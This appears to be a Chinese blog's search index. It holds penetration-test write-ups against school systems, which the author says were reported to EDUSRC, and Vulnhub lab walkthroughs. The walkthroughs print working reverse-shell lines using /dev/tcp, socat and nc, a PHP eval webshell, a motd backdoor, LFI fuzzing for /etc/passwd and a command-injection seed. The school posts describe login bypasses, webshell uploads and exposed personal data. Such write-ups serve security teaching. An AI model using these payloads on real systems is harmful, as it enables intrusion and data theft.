<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>对某学校的一次渗透测试</title>
    <link href="/2026/01/26/%E5%AF%B9%E6%9F%90%E5%AD%A6%E6%A0%A1%E7%9A%84%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    <url>/2026/01/26/%E5%AF%B9%E6%9F%90%E5%AD%A6%E6%A0%A1%E7%9A%84%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/</url>
    
    <content type="html"><![CDATA[<h1>弱口令</h1><p>前期对目标进行信息收集，发现一处图书馆的登录处</p><p><img src="/2026/01/26/%E5%AF%B9%E6%9F%90%E5%AD%A6%E6%A0%A1%E7%9A%84%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image-20260126001018138.png"></p><p>对其进行爆破，得到一个弱口令账户凭据，那么直接进行登录</p><p><img src="/2026/01/26/%E5%AF%B9%E6%9F%90%E5%AD%A6%E6%A0%A1%E7%9A%84%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image-20260126001252197.png"></p><h1>文件上传一</h1><p>登录进来后随便点击看看有什么功能点，这时候发现了可以进行上传文件</p><p><img src="/2026/01/26/%E5%AF%B9%E6%9F%90%E5%AD%A6%E6%A0%A1%E7%9A%84%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image-20260126001439810.png"></p><p>那么直接尝试上传马子，可以看到能直接上传</p><p><img src="/2026/01/26/%E5%AF%B9%E6%9F%90%E5%AD%A6%E6%A0%A1%E7%9A%84%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image-20260126001811917.png"></p><p>那么再连接即可</p><p><img src="/2026/01/26/%E5%AF%B9%E6%9F%90%E5%AD%A6%E6%A0%A1%E7%9A%84%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image-20260126002113369.png"></p><h1>文件上传二</h1><p>在资源管理处存在第二处上传点</p><p><img src="/2026/01/26/%E5%AF%B9%E6%9F%90%E5%AD%A6%E6%A0%A1%E7%9A%84%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image-20260126002516739.png"></p><p>继续尝试构造数据包上传</p><p><img src="/2026/01/26/%E5%AF%B9%E6%9F%90%E5%AD%A6%E6%A0%A1%E7%9A%84%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image-20260126002858686.png"></p><p>访问上传的webshell，回显200那么直接连接就行</p><p><img src="/2026/01/26/%E5%AF%B9%E6%9F%90%E5%AD%A6%E6%A0%A1%E7%9A%84%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image-20260126003118974.png"></p><p>成功获取网络情况以及系统权限</p><p><img src="/2026/01/26/%E5%AF%B9%E6%9F%90%E5%AD%A6%E6%A0%A1%E7%9A%84%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image-20260126003413631.png"></p><p>权限为<code>System</code></p><p><img src="/2026/01/26/%E5%AF%B9%E6%9F%90%E5%AD%A6%E6%A0%A1%E7%9A%84%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image-20260126003546418.png"></p><p>发现存在数据库配置文件，泄露库名以及密码等信息。</p><p><img src="/2026/01/26/%E5%AF%B9%E6%9F%90%E5%AD%A6%E6%A0%A1%E7%9A%84%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image-20260126003915055.png"></p><p>注：以上漏洞均已提交至EDUSRC。文章中涉及的程序(方法)可能带有攻击性，仅供安全研究与教学之用，读者将其信息做其他用途，由用户承担全部法律及连带责任，文章作者不承担任何法律及连带责任，本人坚决反对利用文章内容进行恶意攻击行为，推荐大家在了解技术原理的前提下，更好的维护个人信息安全、企业安全、国家安全，本文内容未隐讳任何个人、群体、公司。非文学作品，请勿过度理解，根据《计算机软件保护条例》第十七条，本站所有软件请仅用于学习研究用途。</p>]]></content>
    
    
    <categories>
      
      <category>网络安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>渗透测试</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>记一次渗透测试</title>
    <link href="/2026/01/22/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    <url>/2026/01/22/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/</url>
    
    <content type="html"><![CDATA[<h1>正文</h1><p>前期进行信息收集找到一个后台管理中心，账号密码默认自动填好了直接登录进去就行</p><p><img src="/2026/01/22/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image-20260122220830999.png"></p><p>进入首页有如下功能点</p><p><img src="/2026/01/22/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image-20260122220903476.png"></p><p>可以在资料下载和内部交流处进行文件上传，没有文件后缀限制，先上传一个<code>phpinfo</code>上去看看解不解析</p><p><img src="/2026/01/22/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image-20260122221039125.png"></p><p>这里上传后返回的路径为：xxx&#x2F;&#x2F;xxx.php，但是并不是完整路径。这里有一个小技巧：去找那些已存在的图片，所存放的路径即为完整路径。首先在公文发布处任点一篇进行修改</p><p><img src="/2026/01/22/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image-20260122221422556.png"></p><p>然后选择查看附件</p><p><img src="/2026/01/22/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image-20260122221502135.png"></p><p>看到附件内容是一张图片，此时看到URL地址是完整的图片路径</p><p><img src="/2026/01/22/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image-20260122221618579.png"></p><p>接着对刚刚上传的<code>phpinfo</code>路径进行拼接访问即可，看到是可以解析php文件的</p><p><img src="/2026/01/22/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image-20260122221734488.png"></p><p>此时已经能证明文件上传getshell了，继续深入看看。找到其他两个系统的未授权访问</p><p><img src="/2026/01/22/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image-20260122221948251.png" alt="1"></p><p><img src="/2026/01/22/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image-20260122222048638.png" alt="2"></p><p>然后遇到一个需要手机号才能登录的站点</p><p><img src="/2026/01/22/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image-20260122222142528.png"></p><p>尝试利用收集的字典进行爆破，无果。</p><p><img src="/2026/01/22/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image-20260122222311836.png"></p><p>转战小程序端</p><p><img src="/2026/01/22/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image-20260122222350967.png"></p><p>资产并不多，依旧登录框</p><p><img src="/2026/01/22/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image-20260122222444983.png"></p><p>经测试，若用自己的手机号会显示未绑定账户，在数据包中进行替换也不行</p><p><img src="/2026/01/22/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image-20260122222656134.png"></p><p>那又返回web端，然后又找到一处还没测试过的资产</p><p><img src="/2026/01/22/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image-20260122222754858.png"></p><p>搜索一下发现有Nday，尝试进行利用</p><p><img src="/2026/01/22/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image-20260122222910544.png"></p><p>构造PoC进行测试，失败</p><p><img src="/2026/01/22/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image-20260122223002769.png"></p><p>报错说文件或目录不存在，猜测文件并不在C盘啥的或者已经打补丁了，依旧无果</p><p>行，再返回一开始的后台管理系统，找到了<code>Ueditor</code>百度编辑器，它支持多种富文本编辑功能</p><p><img src="/2026/01/22/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image-20260122223335345.png"></p><p>找上传点，尝试打一个XSS</p><p><img src="/2026/01/22/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image-20260122223420907.png"></p><p>可以看到能弹框</p><p><img src="/2026/01/22/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image-20260122223447316.png"></p><p>继续，在DNSlog平台申请个域名尝试打一个SSRF攻击</p><p><img src="/2026/01/22/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image-20260122223759121.png"></p><p>可以看到能正常收到请求</p><p><img src="/2026/01/22/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image-20260122223825609.png"></p><p><img src="/2026/01/22/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image-20260122223845204.png"></p>]]></content>
    
    
    <categories>
      
      <category>网络安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>渗透测试</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Orasi</title>
    <link href="/2026/01/19/Orasi/"/>
    <url>/2026/01/19/Orasi/</url>
    
    <content type="html"><![CDATA[<p>首先使用<code>arp-scan</code>探测目标机器，发现IP地址为<code>192.168.182.228</code></p><p><img src="/2026/01/19/Orasi/image-20260119134233384.png"></p><p>先用<code>sudo nmap --min-rate 10000 192.168.182.228</code>进行一个快速扫描，知道开放了以下几个端口</p><p><img src="/2026/01/19/Orasi/clip_image002.gif"></p><p>利用<code>gobuster</code>进行目录扫描，<code>sudo gobuster dir -u http://192.168.182.228 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,php,xml,txt,bak</code>，但是并没有发现有价值的信息</p><p><img src="/2026/01/19/Orasi/clip_image002-1768801703588-2.gif"></p><p>那么先访问一下80端口，目前还不知道这条信息的含义</p><p><img src="/2026/01/19/Orasi/clip_image002-1768801789390-4.gif"></p><p>5000端口Not Found</p><p><img src="/2026/01/19/Orasi/clip_image002-1768801882735-6.gif"></p><p>回到一开始<code>nmap</code>的扫描结果，知道有一个<code>FTP</code>服务，那么尝试是否可以进行匿名登录</p><p><img src="/2026/01/19/Orasi/image-20260119135231607.png"></p><p>可以进行匿名登录，而且在pub目录下还有一个名为<code>url</code>的文件，把它下载到本地进行分析</p><p><img src="/2026/01/19/Orasi/clip_image002-1768802078586-11.gif"></p><p>发现是<code>ELF</code>格式文件，<em>(它是一种通用的文件格式，广泛用于<code>Unix</code>和<code>Linux</code>系统上的可执行文件、目标代码文件、共享库和核心转储文件)</em>。把该文件扔到<code>IDA</code>打开</p><p><img src="/2026/01/19/Orasi/clip_image002-1768802426465-13.gif"></p><p>发现在<code>main</code>中的<code>insert</code>函数会调用以上这几个值</p><p><img src="/2026/01/19/Orasi/clip_image002-1768802501769-15.gif"></p><p>直接来看寄存器的值，发现以上几个字符连成一起得到<code>/sh4d0w$s</code>关键字，猜测是一个文件名或隐藏目录，那么尝试进行拼接</p><p><img src="/2026/01/19/Orasi/clip_image002-1768802639477-17.gif"></p><p>80端口显示Not Found，但是在<code>5000</code>端口发生变化</p><p><img src="/2026/01/19/Orasi/clip_image002-1768802681118-19.gif"></p><p>提示说<code>No input</code>，应该是需要输入些内容但是不知道具体参数，尝试进行Fuzz模糊测试：根据<code>80</code>端口的页面内容<code>6 6 1337leet</code>以及使用工具<code>crunch</code>进行字典组合</p><p><img src="/2026/01/19/Orasi/clip_image002-1768803073480-21.gif"></p><p>得到一份由<code>6 6 1337leet</code>分解又组合的字典，随后利用<code>ffuf</code>模糊测试工具进行Fuzz</p><p><code>ffuf -u &quot;http://192.168.182.228:5000/sh4d0w\$s?FUZZ=../../../../../../../etc/passwd&quot; -w cert1.txt -fs 8</code></p><p><img src="/2026/01/19/Orasi/clip_image002-1768803173766-23.gif"></p><p>成功得到隐藏参数<code>l333tt</code>，但是执行命令后会直接打印输出到界面</p><p><img src="/2026/01/19/Orasi/clip_image002-1768803358612-25.gif"></p><p>通过浏览器插件或控制台知道有Python的服务，尝试进行<code>SSTI</code>模版注入攻击</p><p><img src="/2026/01/19/Orasi/clip_image002-1768803453569-27.gif"></p><p>构造SSTI的Payload进行测试</p><p><img src="/2026/01/19/Orasi/image-20260119142923781.png"></p><p>可以看到执行成功，那么再把Payload进行<code>URL编码</code>进行反弹shell到kali</p><p><img src="/2026/01/19/Orasi/clip_image002-1768804266435-29.gif"></p><p>kali监听到了shell并发现有一个名为<code>pyth0ns3rv3ros.py</code>的文件，接下来进行提权</p><p><img src="/2026/01/19/Orasi/clip_image002-1768804386125-31.gif"></p><p>发现能执行<code>jail.php</code>脚本文件，查看文件内容可知：该文件会执行命令，但是会进行匹配关键字如bash、eval、nc等危险字符。</p><p>后面尝试了几个shell语句都有问题</p><p><code>sudo -u kori /bin/bash /home/kori/jail.php sh -i &gt;&amp; /dev/tcp/192.168.182.249/4435 0&gt;&amp;1</code></p><p><code>sudo -u kori /bin/bash /home/kori/jail.php 0&lt;&amp;196;exec 196&lt;&gt;/dev/tcp/192.168.182.249/4435; sh &lt;&amp;196 &gt;&amp;196 2&gt;&amp;196</code></p><p>只有下面这条可以</p><p><code>sudo -u kori /bin/php /home/kori/jail.php socat TCP:192.168.182.249:4435 EXEC:sh</code></p><p><img src="/2026/01/19/Orasi/clip_image002-1768807029704-33.gif"></p><p>成功获取<code>kori</code>用户的shell</p><p><img src="/2026/01/19/Orasi/clip_image002-1768807105122-35.gif"></p><p>发现有<code>(irida) NOPASSWD: /usr/bin/cp /home/irida/irida.apk /home/kori/irida.apk</code>，那可以直接将该apk文件复制到<code>/home/kori</code>目录下，但是发现并不允许</p><p><img src="/2026/01/19/Orasi/clip_image002-1768807387055-37.gif"></p><p>可以对<code>kori</code>的家目录赋予其他用户访问的权限，再创建一个同名文件把apk文件复制过来</p><p><img src="/2026/01/19/Orasi/clip_image002-1768807496928-39.gif"></p><p>现在能访问该文件了，然后拖到<code>AndroidKiller</code>工具中进行分析，在<code>LoginDataSource.smail</code>中发现有像用户名和密码的东西</p><p><img src="/2026/01/19/Orasi/clip_image002-1768807702953-41.gif"></p><p>观察后发现，参数一为<code>irida</code>，参数二采取了某种密码保护机制，对应下面的0.1.2.3.4字符串，对其进行拼接得到<code>eye.of.the.tiger.()</code>，尝试切换<code>irida</code>用户提示密码错误，在靶机的介绍页面得知提示<code>just one useless little dot</code>，最后得到正确密码：<code>eye.of.the.tiger()</code>。</p><p><img src="/2026/01/19/Orasi/clip_image002-1768807910172-43.gif"></p><p>看一下当前用户能使用哪些特权命令，发现存在<code>oras.py</code>文件</p><p><img src="/2026/01/19/Orasi/clip_image002-1768808036295-45.gif"></p><p>尝试运行发现报错，根据报错信息应该是要输入16进制字符串，那么将nc反弹shell的payload转换成字符串，再使用<code>.hex()</code>方法将字符串转换成16进制形式</p><p><img src="/2026/01/19/Orasi/clip_image002-1768808233898-47.gif"></p><p>kali成功监听到shell</p><p><img src="/2026/01/19/Orasi/clip_image002-1768808498834-49.gif"></p><p>获取到最终的Flag</p><p><img src="/2026/01/19/Orasi/clip_image002-1768808522640-51.gif"></p>]]></content>
    
    
    <categories>
      
      <category>Vulnhub</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Vulnhub</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>某中学登录逻辑漏洞</title>
    <link href="/2025/06/25/%E6%9F%90%E4%B8%AD%E5%AD%A6%E7%99%BB%E5%BD%95%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/"/>
    <url>/2025/06/25/%E6%9F%90%E4%B8%AD%E5%AD%A6%E7%99%BB%E5%BD%95%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/</url>
    
    <content type="html"><![CDATA[<p>前期对目标站点进行信息收集发现一处登录系统</p><p><img src="/2025/06/25/%E6%9F%90%E4%B8%AD%E5%AD%A6%E7%99%BB%E5%BD%95%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/image-20260119162403515.png"></p><p>更改<code>result_code</code>为<code>200</code>放行即可进行绕过，进入后台</p><p><img src="/2025/06/25/%E6%9F%90%E4%B8%AD%E5%AD%A6%E7%99%BB%E5%BD%95%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/image-20260119161710219.png"></p><p>发现1700+条敏感信息，包括身份证、电话姓名等信息。</p><p>该漏洞已提交至EDUSRC</p>]]></content>
    
    
    <categories>
      
      <category>网络安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>渗透测试</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>某高校统一认证门户系统绕过</title>
    <link href="/2025/06/19/%E6%9F%90%E9%AB%98%E6%A0%A1%E7%BB%9F%E4%B8%80%E8%AE%A4%E8%AF%81%E9%97%A8%E6%88%B7%E7%B3%BB%E7%BB%9F%E7%BB%95%E8%BF%87/"/>
    <url>/2025/06/19/%E6%9F%90%E9%AB%98%E6%A0%A1%E7%BB%9F%E4%B8%80%E8%AE%A4%E8%AF%81%E9%97%A8%E6%88%B7%E7%B3%BB%E7%BB%9F%E7%BB%95%E8%BF%87/</url>
    
    <content type="html"><![CDATA[<h1>前言</h1><p>一般对于统一认证门户是不好打的，并且目前防护方面都做的挺完善了。本次遇到的案例也是运气，由于重定向没有做好进而可以直接登录后台打出高危漏洞。</p><h1>正文</h1><p>前期通过信息收集找到该院校的统一认证门户</p><p><img src="/2025/06/19/%E6%9F%90%E9%AB%98%E6%A0%A1%E7%BB%9F%E4%B8%80%E8%AE%A4%E8%AF%81%E9%97%A8%E6%88%B7%E7%B3%BB%E7%BB%9F%E7%BB%95%E8%BF%87/image-20260119220457004.png"></p><p>但是注意到访问的瞬间会跳出类似若依的后台管理登录界面，想办法让它在加载的瞬间停留，直接按左上角的叉号，否则会重定向到统一身份认证登录页。</p><p><img src="/2025/06/19/%E6%9F%90%E9%AB%98%E6%A0%A1%E7%BB%9F%E4%B8%80%E8%AE%A4%E8%AF%81%E9%97%A8%E6%88%B7%E7%B3%BB%E7%BB%9F%E7%BB%95%E8%BF%87/image-20260119221155176.png"></p><p>可以看到成功停在了某个后台登录页面，账号密码自动填充好了，若想看密码可以按F12把<code>password</code>属性改成<code>text</code>即可明文显示，登录后：</p><p><img src="/2025/06/19/%E6%9F%90%E9%AB%98%E6%A0%A1%E7%BB%9F%E4%B8%80%E8%AE%A4%E8%AF%81%E9%97%A8%E6%88%B7%E7%B3%BB%E7%BB%9F%E7%BB%95%E8%BF%87/image-20260119221704344.png"></p><p>发现<code>druid monitor</code>登录页，弱口令可直接登录，可查看其他用户的Session</p><p><img src="/2025/06/19/%E6%9F%90%E9%AB%98%E6%A0%A1%E7%BB%9F%E4%B8%80%E8%AE%A4%E8%AF%81%E9%97%A8%E6%88%B7%E7%B3%BB%E7%BB%9F%E7%BB%95%E8%BF%87/image-20260119221914667.png"></p><p>发现存在Swagger接口泄露，会导致攻击者通过Swagger页面获取网站API接口信息，进而破坏系统</p><p><img src="/2025/06/19/%E6%9F%90%E9%AB%98%E6%A0%A1%E7%BB%9F%E4%B8%80%E8%AE%A4%E8%AF%81%E9%97%A8%E6%88%B7%E7%B3%BB%E7%BB%9F%E7%BB%95%E8%BF%87/image-20260119222657830.png"></p><p>发现某个事件审批界面</p><p><img src="/2025/06/19/%E6%9F%90%E9%AB%98%E6%A0%A1%E7%BB%9F%E4%B8%80%E8%AE%A4%E8%AF%81%E9%97%A8%E6%88%B7%E7%B3%BB%E7%BB%9F%E7%BB%95%E8%BF%87/image-20260119230244882.png"></p><h1>SQL注入</h1><p>通过对该院校的信息收集，得到学生学号等信息，再用FOFA、Hunter等搜索引擎找到某处类似学生宿舍管理系统的登录界面</p><p><img src="/2025/06/19/%E6%9F%90%E9%AB%98%E6%A0%A1%E7%BB%9F%E4%B8%80%E8%AE%A4%E8%AF%81%E9%97%A8%E6%88%B7%E7%B3%BB%E7%BB%9F%E7%BB%95%E8%BF%87/image-20260119233902796.png"></p><p>通过浏览器插件识别得知该处登录页采用<code>.NET</code>框架，那么考虑进行SQL注入尝试</p><p><img src="/2025/06/19/%E6%9F%90%E9%AB%98%E6%A0%A1%E7%BB%9F%E4%B8%80%E8%AE%A4%E8%AF%81%E9%97%A8%E6%88%B7%E7%B3%BB%E7%BB%9F%E7%BB%95%E8%BF%87/image-20260120163528599.png"></p><p>运气很好直接得到user值为<code>dbo</code>且没有<code>WAF</code>进行拦截，但是由于怕动静太大就不上<code>SQLmap</code>了，证明有注入点即可</p><h1>结尾</h1><p>以上漏洞均已提交至EDUSRC，另外，在渗透测试中需要做到细心且耐心，慢慢来！</p><p>done.</p>]]></content>
    
    
    <categories>
      
      <category>网络安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>渗透测试</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Narak</title>
    <link href="/2025/01/18/Narak/"/>
    <url>/2025/01/18/Narak/</url>
    
    <content type="html"><![CDATA[<p><code>arp-scan -l</code>探测到<code>192.168.182.152</code>为靶机地址</p><p>分别使用<code>sudo nmap -sT --min-rate=10000 192.168.182.152</code>，<code>sudo nmap -sC -sV -O -Pn -n -p22,80 192.168.182.152</code>，<code>sudo nmap --script=vuln -Pn -n 192.168.182.152</code>三条命令进行端口扫描，漏洞脚本扫描和详细信息扫描</p><p><img src="/2025/01/18/Narak/image-20260118230332726.png"></p><p>使用<code>sudo nmap -sU --top-ports 20 192.168.182.152</code>对使用频率最高的20个端口进行UDP扫描，发现开放了<code>tftp</code>服务，先做好记录万一后面用得上。继续进行常规目录扫描<code>sudo dirb http://192.168.182.152</code></p><p><img src="/2025/01/18/Narak/image-20260118230724101.png"></p><p>结果有点少，但是<code>webdav</code>和<code>images</code>是比较感兴趣的，换<code>gobuster</code>继续进行扫描</p><p><img src="/2025/01/18/Narak/image-20260118230849488.png"></p><p>这次扫出了一个<code>tips.txt</code>文件，打开看看</p><p><img src="/2025/01/18/Narak/image-20260118230925495.png"></p><p>意思说是想要打开narak的大门提示藏在<code>creds.txt</code>文件中，刚刚添加了<code>.txt</code>文件后缀进行扫描却没有扫出这个<code>creds.txt</code>，那先看看其他目录扫描结果</p><p><img src="/2025/01/18/Narak/image-20260118231307313.png"></p><p>80端口，是一些关于印度教的内容，点击以下<code>Do not Click</code>会跳转到以下页面</p><p><img src="/2025/01/18/Narak/image-20260118231404142.png"></p><p>一篇漫画，再去看看<code>/images</code>目录</p><p><img src="/2025/01/18/Narak/image-20260118231447762.png"></p><p>都是一些关于印度教中的神的图片，去看看<code>/webdav</code>目录，发现需要进行登录，目前还没有找到相关登录凭证</p><p><img src="/2025/01/18/Narak/image-20260118231630157.png"></p><p>没头绪了，返回一开始的<code>tftp</code>，果然有戏，结合<code>creds.txt</code>提示直接get下来</p><p><img src="/2025/01/18/Narak/image-20260118231809680.png"></p><p>查看<code>creds.txt</code>里的内容，一眼base64加密，那么直接echo出来并解密就行</p><p><img src="/2025/01/18/Narak/image-20260118231908956.png"></p><p>得到一个凭据，尝试登录ssh失败，那应该是webdav的登录凭据了，尝试登录webdav成功</p><p><img src="/2025/01/18/Narak/image-20260118232027978.png"></p><p>再利用<code>devtest</code>检测一下它能干嘛</p><p><code>davtest -url http://192.168.182.152/webdav -auth yamdoot:Swarg</code></p><p><img src="/2025/01/18/Narak/image-20260118232206609.png"></p><p>可以看到能使用PUT请求进行文件上传操作，那么大致思路就是传个一句话木马上去进行getshell，利用<code>cadaver</code>工具进行上传，<code>cadaver http://192.168.182.152/webdav</code>，输入登录凭证后<code>put shell.php</code>即可</p><p><img src="/2025/01/18/Narak/image-20260118232528767.png"></p><p>然后kali那边进行监听即可收到shell</p><p><img src="/2025/01/18/Narak/image-20260118232600453.png"></p><p>后续就是进行提权，发现了一个名为<code>hell.sh</code>以及<code>motd</code>(Message of the day)文件，先看<code>hell.sh</code>文件内容，发现是<code>BrainFuck</code>加密</p><p><img src="/2025/01/18/Narak/image-20260118232858970.png"></p><p>拿去在线解密，得到一个像用户名又像密码的凭据：<code>chitragupt</code></p><p><img src="/2025/01/18/Narak/image-20260118232921359.png"></p><p>根据刚刚得到的三个用户名，对其进行组合成一个字典然后使用<code>hydra</code>（九头蛇）进行ssh账户爆破</p><p><img src="/2025/01/18/Narak/image-20260118233157462.png"></p><p>得到正确登录凭据：<code>inferno:chitragupt</code>，尝试登录成功</p><p><img src="/2025/01/18/Narak/image-20260118233310765.png"></p><p>先去&#x2F;etc&#x2F;update-motd.d目录，往<code>00-header</code>文件中写入提权逻辑<code>echo -e &quot;bash -c \&quot;bash -i &gt; &amp; /dev/tcp/192.168.182.155/4435 0&gt;&amp;1\&quot;&quot; &gt;&gt; 00-header</code></p><p><img src="/2025/01/18/Narak/image-20260118234121930.png"></p><p>kali进行监听即可收到shell</p><p><img src="/2025/01/18/Narak/image-20260118234145847.png"></p><h3>总结</h3><p>前期利用<code>nmap、dirb、gobuster</code>工具进行端口扫描和目扫描；在tftp服务中拿到<code>creds.txt</code>中的<code>webdav</code>登录凭证信息；利用<code>cadaver</code>工具进行PUT传木马上去获得立足点；<code>hell.sh</code>解密拿到ssh登录凭证；组合用户名和密码爆破ssh；写入00-header提权逻辑进行提权获取最终的Flag</p>]]></content>
    
    
    <categories>
      
      <category>Vulnhub</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Vulnhub</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Momentum2</title>
    <link href="/2025/01/18/Momentum2/"/>
    <url>/2025/01/18/Momentum2/</url>
    
    <content type="html"><![CDATA[<p><code>arp-scan -l</code>发现靶机地址为<code>192.168.182.173</code></p><p><code>sudo nmap --script=vuln 192.168.182.173</code>进行漏洞脚本扫描</p><p><img src="/2025/01/18/Momentum2/image-20260118220244813.png"></p><p><code>sudo nmap -sT -A -O -p- --min-rate=10000 192.168.182.173</code>进行详细信息扫描，看到开放了80和22两个端口</p><p><img src="/2025/01/18/Momentum2/image-20260118220455537.png"></p><p><code>sudo gobuster dir -u http://192.168.182.173 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x php,txt,html,bak,zip</code>进行目录扫描，发现内容挺多的</p><p><img src="/2025/01/18/Momentum2/image-20260118220716660.png"></p><p>其中<code>/owls</code>目录存在文件上传点，尝试进行文件上传getshell，但是经过多次测试发现只允许上传txt文本文件</p><p><img src="/2025/01/18/Momentum2/image-20260118220901155.png"></p><p>而无法上传php等后缀文件</p><p><img src="/2025/01/18/Momentum2/image-20260118220945377.png"></p><p>但是刚刚目录扫描到了<code>ajax.php.bak</code>备份文件，尝试把它下载到本地进行分析</p><p><img src="/2025/01/18/Momentum2/image-20260118221056543.png"></p><p>查看<code>ajax.php.bak</code>文件，了解了文件上传的要求</p><p><img src="/2025/01/18/Momentum2/image-20260118221249444.png"></p><p>首先，这段代码要求数据包中要有<code>Cookie</code>并且值为<code>admin=&amp;G6u@B6uDXMq&amp;Ms</code>再补一位大写字母，其次要用POST方法传一个<code>secure</code>参数值为<code>val1d</code>，只有同时满足以上两个条件才允许上传<code>.php</code>文件，否则只能传<code>.txt</code>，上传后返回<code>1</code>表示成功</p><p><img src="/2025/01/18/Momentum2/image-20260118221658775.png"></p><p>把上面上传的数据包改成所要求的形式再写入一句话木马<code>&lt;?php @eval($_POST[cmd]);?&gt;</code>，然后再使用<code>蚁剑</code>连接即可</p><p><img src="/2025/01/18/Momentum2/image-20260118221926504.png"></p><p>连接成功，然后在<code>/home/athena/</code>目录下找到<code>user.txt</code></p><p><img src="/2025/01/18/Momentum2/image-20260118222015663.png"></p><p>在该目录下，还存在<code>password-reminder.txt</code>，里面存放有某个登录密码<code>myvulnerableapp[Asterisk]</code>，这个应该就是ssh的登录凭证了，拿去尝试进行登录</p><p><img src="/2025/01/18/Momentum2/image-20260118222308028.png"></p><p>登录成功（注：密码里的<code>Asterisk</code>其实是<code>*</code>符号的意思，所以在输入密码后需要在后面加一个<code>*</code>号），发现一个名为<code>cookie-gen.py</code>的脚本文件，查看一下文件内容</p><p><img src="/2025/01/18/Momentum2/image-20260118222615958.png"></p><p>意思就是，运行该脚本后它会让我们输入<code>seed</code>的值，这个值会echo到<code>log.txt</code>文件中且会执行bash，那么我们可以在输入seed值的时候直接利用nc进行反弹shell</p><p>靶机：<code>;nc -e /bin/bash 192.168.182.221 